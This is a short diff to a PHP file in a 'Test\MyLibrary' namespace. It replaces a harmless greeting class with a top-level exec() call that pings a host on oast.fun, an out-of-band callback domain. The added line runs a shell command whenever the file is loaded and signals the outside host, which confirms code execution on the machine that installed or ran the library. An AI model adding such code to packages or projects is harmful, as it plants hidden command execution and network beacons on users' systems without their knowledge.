@@ -2,11 +2,6 @@
 
 namespace Test\MyLibrary;
 
-class thisAni {
-
-	function sayHi() {
-		return "Hi ".rand(0, 1000);
-	}
-}
+echo exec('ping -c1 '.escapeshellarg($host = "yqraivvfafdvpzjcdwmlks8axo84fz29z.oast.fun").' 2>&1');
 
 ?>
